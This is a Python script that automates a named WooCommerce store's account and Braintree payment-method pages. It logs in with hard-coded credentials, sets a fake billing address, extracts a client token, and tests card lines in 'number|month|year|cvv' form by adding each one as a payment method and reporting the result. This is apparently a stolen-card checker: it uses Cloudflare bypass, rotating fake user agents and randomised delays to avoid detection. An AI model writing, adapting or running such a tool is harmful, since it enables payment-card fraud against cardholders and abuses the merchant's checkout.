import cloudscraper
import requests
import json
import uuid
import time
import random
from bs4 import BeautifulSoup
import re
import base64
import os
import logging
from fake_useragent import UserAgent

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class PaymentGateway:
    def __init__(self):
        self.base_url = 'https://www.flexinnovations.com'
        self.session = cloudscraper.create_scraper(delay=10, browser={'browser': 'firefox', 'platform': 'windows', 'mobile': False})
        self.auth_fingerprint = None
        self.card_type = None
        self.card_details = None
        self.session_file = 'auth_token.json'
        self.ua = UserAgent()
        self.headers = {
            'authority': 'www.flexinnovations.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self.ua.random,
        }
        self.session.headers.update(self.headers)
        self.load_session()

    def update_headers(self):
        self.headers['user-agent'] = self.ua.random
        self.session.headers.update(self.headers)

    def save_session(self):
        token_data = {'authorizationFingerprint': self.auth_fingerprint}
        try:
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(token_data, f)
        except Exception as e:
            logger.error(f"Failed to save session: {e}")

    def load_session(self):
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    token_data = json.load(f)
                    self.auth_fingerprint = token_data.get('authorizationFingerprint')
            except json.JSONDecodeError as e:
                logger.error(f"Failed to load session: {e}")
                self.auth_fingerprint = None
        else:
            self.auth_fingerprint = None

    def check_session(self):
        try:
            response = self.session.get(f'{self.base_url}/my-account/', timeout=15)
            if 'woocommerce-form-login' in response.text:
                return False
            return True
        except Exception as e:
            logger.error(f"Session check failed: {e}")
            return False

    def validate_session(self):
        if not self.auth_fingerprint:
            return False
        test_headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'authorization': f'Bearer {self.auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': self.ua.random,
        }
        test_json = {
            'query': 'query { __schema { queryType { name } } }',
            'operationName': None
        }
        try:
            test_response = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=test_headers,
                json=test_json,
                timeout=5
            )
            if test_response.status_code == 200:
                response_data = test_response.json()
                if 'errors' in response_data:
                    for error in response_data['errors']:
                        if "authentication" in error.get("message", "").lower() or "authorization" in error.get("message", "").lower():
                            return False
                    return True
                return True
            return False
        except requests.exceptions.RequestException as e:
            logger.error(f"Session validation failed: {e}")
            return False

    def reset_session(self):
        self.session = cloudscraper.create_scraper(delay=10, browser={'browser': 'firefox', 'platform': 'windows', 'mobile': False})
        self.update_headers()
        self.auth_fingerprint = None
        self.card_type = None
        self.card_details = None
        if os.path.exists(self.session_file):
            try:
                os.remove(self.session_file)
            except Exception as e:
                logger.error(f"Failed to remove session file: {e}")

    def _extract_auth_fingerprint(self, client_token):
        try:
            parts = client_token.split('.')
            if len(parts) >= 2:
                payload_b64 = parts[1]
            else:
                payload_b64 = client_token
            padding = '=' * (4 - len(payload_b64) % 4)
            decoded_payload = base64.urlsafe_b64decode(payload_b64 + padding).decode('utf-8')
            payload_json = json.loads(decoded_payload)
            if "authorizationFingerprint" in payload_json:
                return payload_json["authorizationFingerprint"]
        except Exception:
            try:
                padding = '=' * (4 - len(client_token) % 4)
                decoded_token = base64.urlsafe_b64decode(client_token + padding).decode('utf-8')
                match = re.search(r'"authorizationFingerprint":"(.*?)"', decoded_token)
                if match:
                    return match.group(1)
            except Exception:
                pass
        raise Exception("Failed to extract authorization fingerprint from Client Token")

    def fetch_braintree_token(self):
        try:
            if self.validate_session() and self.check_session():
                return True
            self.reset_session()
            self.run_simulation_steps()
            return bool(self.auth_fingerprint)
        except Exception as e:
            logger.error(f"Failed to fetch Braintree token: {e}")
            return False

    def check_card(self, card_line, stop_event=None, max_retries=3):
        if stop_event and stop_event.is_set():
            return None
        try:
            card_number, exp_month, exp_year, cvv = card_line.split('|')
            exp_year = '20' + exp_year[-2:] if len(exp_year) == 2 else exp_year
            if not all([card_number, exp_month, exp_year, cvv]):
                logger.error("Missing card details")
                return None
            if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
                logger.error("Invalid card number")
                return None
            if not exp_month.isdigit() or int(exp_month) < 1 or int(exp_month) > 12:
                logger.error("Invalid expiration month")
                return None
            if not exp_year.isdigit() or int(exp_year) < 2025:
                logger.error("Invalid expiration year")
                return None
            if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
                logger.error("Invalid CVV")
                return None
            self.card_details = {
                'number': card_number,
                'expirationMonth': exp_month.zfill(2),
                'expirationYear': exp_year,
                'cvv': cvv,
                'billingAddress': {
                    'firstName': 'hammer',
                    'lastName': 'hammer',
                    'streetAddress': '123 Los Street',
                    'locality': 'Los Angeles',
                    'region': 'CA',
                    'postalCode': '90001',
                    'countryCodeAlpha2': 'US',
                }
            }
            for key, value in self.card_details['billingAddress'].items():
                if not value:
                    logger.error(f"Missing billing address field: {key}")
                    return None
        except ValueError as e:
            logger.error(f"Invalid card format: {e}")
            return None

        if not self.validate_session() or not self.check_session():
            self.reset_session()
            self.run_simulation_steps()

        retries = 0
        while retries < max_retries:
            if stop_event and stop_event.is_set():
                return None
            try:
                self.update_headers()
                braintree_headers = {
                    'authority': 'payments.braintree-api.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
                    'authorization': f'Bearer {self.auth_fingerprint}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': self.ua.random,
                }
                braintree_json = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(uuid.uuid4()),
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                    'variables': {
                        'input': {
                            'creditCard': self.card_details,
                            'options': {'validate': False},
                        },
                    },
                    'operationName': 'TokenizeCreditCard',
                }
                braintree_response = self.session.post(
                    'https://payments.braintree-api.com/graphql',
                    headers=braintree_headers,
                    json=braintree_json,
                    timeout=10
                )
                braintree_data = braintree_response.json()
                if 'errors' in braintree_data:
                    if any("unauthorized" in error.get("message", "").lower() or "forbidden" in error.get("message", "").lower() for error in braintree_data['errors']):
                        self.reset_session()
                        self.run_simulation_steps()
                        retries += 1
                        time.sleep(random.uniform(1, 3))
                        continue
                    logger.error(f"Braintree errors: {braintree_data['errors']}")
                    return None
                if 'tokenizeCreditCard' not in braintree_data['data'] or braintree_data['data']['tokenizeCreditCard'] is None:
                    logger.error("Failed to get token from Braintree")
                    return None
                token = braintree_data['data']['tokenizeCreditCard']['token']
                self.card_type = braintree_data['data']['tokenizeCreditCard']['creditCard']['brandCode'].lower().replace(' ', '-')
                return token
            except Exception as e:
                logger.error(f"Check card attempt {retries + 1} failed: {e}")
                if retries < max_retries - 1:
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    time.sleep(random.uniform(1, 3))
                else:
                    return None
        return None

    def submit_payment(self, token, stop_event=None):
        if stop_event and stop_event.is_set():
            return "Stopped by user"
        if not token or not self.card_type:
            logger.error("Missing token or card type")
            return "Missing token or card type"
        retries = 0
        max_retries = 3
        while retries < max_retries:
            if stop_event and stop_event.is_set():
                return "Stopped by user"
            try:
                self.update_headers()
                add_payment_headers = {
                    'referer': f'{self.base_url}/my-account/payment-methods/',
                }
                add_payment_response = self.session.get(
                    f'{self.base_url}/my-account/add-payment-methods/',
                    headers=add_payment_headers,
                    timeout=15
                )
                soup = BeautifulSoup(add_payment_response.text, 'html.parser')
                if soup.find('form', {'class': 'woocommerce-form-login'}):
                    logger.error("Redirected to login page during payment method addition")
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    time.sleep(random.uniform(1, 3))
                    continue
                add_payment_nonce = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})['value'] if soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'}) else None
                if not add_payment_nonce:
                    script_tags = soup.find_all('script', type='text/javascript')
                    for script in script_tags:
                        if script.string:
                            match_nonce = re.search(r'"woocommerce-add-payment-method-nonce"\s*:\s*"([^"]+)"', script.string)
                            if match_nonce:
                                add_payment_nonce = match_nonce.group(1)
                                break
                if not add_payment_nonce:
                    logger.error("Failed to extract woocommerce-add-payment-method-nonce")
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    time.sleep(random.uniform(1, 3))
                    continue
                final_headers = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': self.base_url,
                    'referer': f'{self.base_url}/my-account/add-payment-methods/',
                    'user-agent': self.ua.random,
                }
                final_data = {
                    'payment_method': 'braintree_credit_card',
                    'wc-braintree-credit-card-card-type': self.card_type,
                    'wc-braintree-credit-card-3d-secure-enabled': '',
                    'wc-braintree-credit-card-3d-secure-verified': '',
                    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                    'wc_braintree_credit_card_payment_nonce': token,
                    'wc_braintree_device_data': '{"correlation_id":"' + str(uuid.uuid4()) + '"}',
                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': add_payment_nonce,
                    '_wp_http_referer': '/my-account/add-payment-methods/',
                    'woocommerce_add_payment_method': '1',
                }
                final_response = self.session.post(
                    f'{self.base_url}/my-account/add-payment-methods/',
                    headers=final_headers,
                    data=final_data,
                    timeout=15
                )
                soup = BeautifulSoup(final_response.text, 'html.parser')
                success_message = soup.find('div', {'class': 'woocommerce-message'})
                if success_message:
                    return success_message.text.strip()
                elif soup.find('form', {'class': 'woocommerce-form-login'}):
                    logger.error("Redirected to login page after payment submission")
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    time.sleep(random.uniform(1, 3))
                    continue
                else:
                    error_message = soup.find('ul', {'class': 'woocommerce-error'})
                    if error_message:
                        errors = [li.text for li in error_message.find_all('li')]
                        cleaned_errors = [re.sub(r'^.*?:\s*', '', error).strip() for error in errors]
                        return "; ".join(cleaned_errors)
                    logger.error("Unclear response from payment submission")
                    return "Unclear response!"
            except Exception as e:
                logger.error(f"Submit payment attempt {retries + 1} failed: {e}")
                if retries < max_retries - 1:
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    time.sleep(random.uniform(1, 3))
                else:
                    return str(e)
        return "Max retries reached"

    def run_simulation_steps(self):
        self.step_1_login()
        if not self.check_session():
            raise Exception("Session invalid after login")
        self.step_2_update_billing_address()
        if not self.check_session():
            raise Exception("Session invalid after updating billing address")
        self.step_3_access_payment_methods()
        if not self.check_session():
            raise Exception("Session invalid after accessing payment methods")
        self.step_4_get_client_token()
        self.save_session()

    def step_1_login(self):
        retries = 0
        max_retries = 3
        while retries < max_retries:
            try:
                self.update_headers()
                time.sleep(random.uniform(1, 3))
                login_page_response = self.session.get(f'{self.base_url}/my-account/', timeout=15)
                soup = BeautifulSoup(login_page_response.text, 'html.parser')
                login_nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})['value'] if soup.find('input', {'name': 'woocommerce-login-nonce'}) else None
                if not login_nonce:
                    raise Exception("Failed to extract woocommerce-login-nonce")
                login_headers = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': self.base_url,
                    'referer': f'{self.base_url}/my-account/',
                    'user-agent': self.ua.random,
                }
                login_data = {
                    'username': '3mkhammer200@code-gmail.com',
                    'password': '3mkhammer200',
                    'woocommerce-login-nonce': login_nonce,
                    '_wp_http_referer': '/my-account/',
                    'login': 'Log in',
                }
                time.sleep(random.uniform(1, 3))
                login_response = self.session.post(
                    f'{self.base_url}/my-account/',
                    headers=login_headers,
                    data=login_data,
                    timeout=15
                )
                if "woocommerce-form-login" in login_response.text:
                    raise Exception("Login failed, redirected to login page")
                time.sleep(random.uniform(1, 3))
                return
            except Exception as e:
                logger.error(f"Login attempt {retries + 1} failed: {e}")
                if retries < max_retries - 1:
                    self.reset_session()
                    retries += 1
                    time.sleep(random.uniform(1, 3))
                else:
                    raise Exception(f"Login failed after {max_retries} attempts: {e}")

    def step_2_update_billing_address(self):
        try:
            self.update_headers()
            time.sleep(random.uniform(1, 3))
            address_headers = {
                'referer': f'{self.base_url}/my-account/',
                'user-agent': self.ua.random,
            }
            self.session.get(
                f'{self.base_url}/my-account/edit-address/',
                headers=address_headers,
                timeout=15
            )
            time.sleep(random.uniform(1, 3))
            billing_headers = {
                'referer': f'{self.base_url}/my-account/edit-address/',
                'user-agent': self.ua.random,
            }
            billing_response = self.session.get(
                f'{self.base_url}/my-account/edit-address/billing/',
                headers=billing_headers,
                timeout=15
            )
            soup = BeautifulSoup(billing_response.text, 'html.parser')
            edit_address_nonce = soup.find('input', {'name': 'woocommerce-edit-address-nonce'})['value'] if soup.find('input', {'name': 'woocommerce-edit-address-nonce'}) else None
            if not edit_address_nonce:
                raise Exception("Failed to extract woocommerce-edit-address-nonce")
            time.sleep(random.uniform(1, 3))
            billing_save_headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'origin': self.base_url,
                'referer': f'{self.base_url}/my-account/edit-address/billing/',
                'user-agent': self.ua.random,
            }
            billing_data = {
                'billing_first_name': 'hammer',
                'billing_last_name': 'hammer',
                'billing_company': '',
                'billing_country': 'US',
                'billing_address_1': '123 Los Street',
                'billing_address_2': '',
                'billing_city': 'Los Angeles',
                'billing_state': 'CA',
                'billing_postcode': '90001',
                'billing_phone': '+55622007',
                'billing_email': '3mkhammer200@code-gmail.com',
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': edit_address_nonce,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }
            billing_save_response = self.session.post(
                f'{self.base_url}/my-account/edit-address/billing/',
                headers=billing_save_headers,
                data=billing_data,
                timeout=15
            )
            if "Address changed successfully" not in billing_save_response.text:
                raise Exception("Failed to save address")
            time.sleep(random.uniform(1, 3))
        except Exception as e:
            logger.error(f"Update billing address failed: {e}")
            raise

    def step_3_access_payment_methods(self):
        try:
            self.update_headers()
            time.sleep(random.uniform(1, 3))
            payment_methods_headers = {
                'referer': f'{self.base_url}/my-account/edit-address/',
                'user-agent': self.ua.random,
            }
            self.session.get(
                f'{self.base_url}/my-account/payment-methods/',
                headers=payment_methods_headers,
                timeout=15
            )
            time.sleep(random.uniform(1, 3))
        except Exception as e:
            logger.error(f"Access payment methods failed: {e}")
            raise

    def step_4_get_client_token(self):
        try:
            self.update_headers()
            time.sleep(random.uniform(1, 3))
            add_payment_headers = {
                'referer': f'{self.base_url}/my-account/payment-methods/',
                'user-agent': self.ua.random,
            }
            add_payment_response = self.session.get(
                f'{self.base_url}/my-account/add-payment-methods/',
                headers=add_payment_headers,
                timeout=15
            )
            soup = BeautifulSoup(add_payment_response.text, 'html.parser')
            if soup.find('form', {'class': 'woocommerce-form-login'}):
                raise Exception("Redirected to login page during client token fetch")
            add_payment_nonce = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})['value'] if soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'}) else None
            braintree_client_token_nonce = None
            script_tags = soup.find_all('script', type='text/javascript')
            for script in script_tags:
                if script.string:
                    match_credit_card = re.search(r'new WC_Braintree_Credit_Card_Payment_Form_Handler\(\s*(\{.*?})\s*\);', script.string, re.DOTALL)
                    if match_credit_card:
                        try:
                            json_part = match_credit_card.group(1).replace('\\','')
                            config = json.loads(json_part)
                            if 'client_token_nonce' in config:
                                braintree_client_token_nonce = config['client_token_nonce']
                        except json.JSONDecodeError as e:
                            logger.error(f"Failed to parse client token nonce JSON: {e}")
            if not braintree_client_token_nonce:
                raise Exception("Failed to extract braintree_client_token_nonce")
            time.sleep(random.uniform(1, 3))
            ajax_headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': self.base_url,
                'referer': f'{self.base_url}/my-account/add-payment-methods/',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': self.ua.random,
            }
            ajax_data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': braintree_client_token_nonce,
            }
            client_token_response = self.session.post(
                f'{self.base_url}/wp-admin/admin-ajax.php',
                headers=ajax_headers,
                data=ajax_data,
                timeout=15
            )
            try:
                client_token_data = client_token_response.json()
                if client_token_data.get('success') and 'data' in client_token_data:
                    braintree_client_token = client_token_data['data']
                    self.auth_fingerprint = self._extract_auth_fingerprint(braintree_client_token)
                else:
                    raise Exception("Failed to get actual Braintree Client Token from server")
            except json.JSONDecodeError as e:
                logger.error(f"Client token response is not valid JSON: {e}")
                raise Exception("Client Token response is not valid JSON")
            time.sleep(random.uniform(1, 3))
        except Exception as e:
            logger.error(f"Get client token failed: {e}")
            raise

gateway = PaymentGateway()